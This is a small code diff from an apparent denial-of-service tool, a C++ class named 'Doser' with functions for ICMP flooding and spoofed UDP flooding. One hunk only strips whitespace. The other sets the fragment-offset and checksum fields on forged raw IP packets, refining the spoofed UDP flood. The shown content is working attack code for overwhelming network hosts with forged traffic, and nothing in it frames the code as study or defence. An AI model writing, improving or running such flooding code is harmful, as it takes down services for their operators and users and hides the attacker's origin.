@@ -422,7 +422,7 @@ void Doser::icmp_flood(const int *id) {
 
             dst.sin_addr = ip->ip_dst;
             dst.sin_family = AF_UNSPEC;
-            
+
             icmp->type = ICMP_ECHO;
             icmp->code = static_cast<u_int8_t>(randomInt(1, 1000));
             icmp->checksum = htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
@@ -572,6 +572,8 @@ void Doser::spoofed_udp_flood(const int *id) {
             ip->ip_id = static_cast<u_short>(randomInt(1, 1000));
             ip->ip_ttl = 64;
             ip->ip_p = 17;
+            ip->ip_off = htons(0x0);
+            ip->ip_sum = 0;
 
             dst.sin_addr = ip->ip_dst;
             dst.sin_family = AF_UNSPEC;
